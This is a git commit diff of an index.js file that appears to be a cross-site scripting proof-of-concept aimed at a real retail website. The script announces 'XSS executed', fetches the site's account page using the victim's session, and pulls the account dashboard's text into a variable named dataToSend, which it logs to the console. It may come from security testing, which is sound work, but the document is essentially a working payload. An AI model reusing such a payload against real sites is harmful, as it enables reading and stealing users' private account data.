0e67961f15fe6bd848453a60d9d2a8b0b3b48a71
Quang NGUYEN VIET <qnguyenviet-ext@pcis.lvmh-pc.com>
2025-08-26 16:06:17 +0200

    init value

--- index.js
+++ index.js
@@ -1,14 +1,18 @@
-(async function () {
+(async function(){
   try {
-    alert("XSS checked");
-    const resp1 = await fetch("https://www.guerlain.com/fr/fr-fr");
+
+    alert('XSS executed');
+
+    const resp1 = await fetch('https://www.guerlain.com/fr/fr-fr/account');
     const page = await resp1.text();
-    const doc = new DOMParser().parseFromString(page, "text/html");
-    const element = doc.querySelector(".dashboard-content.container");
+    
+    const doc = new DOMParser().parseFromString(page, 'text/html');
+    const element = doc.querySelector('.dashboard-content.container');
     const dataToSend = element ? element.textContent.trim() : null;
-    console.log(dataToSend)
+
+    console.log(dataToSend);
 
   } catch (err) {
-    console.error("Erreur détectée :", err);
+    console.error('Erreur détectée :', err);
   }
 })();
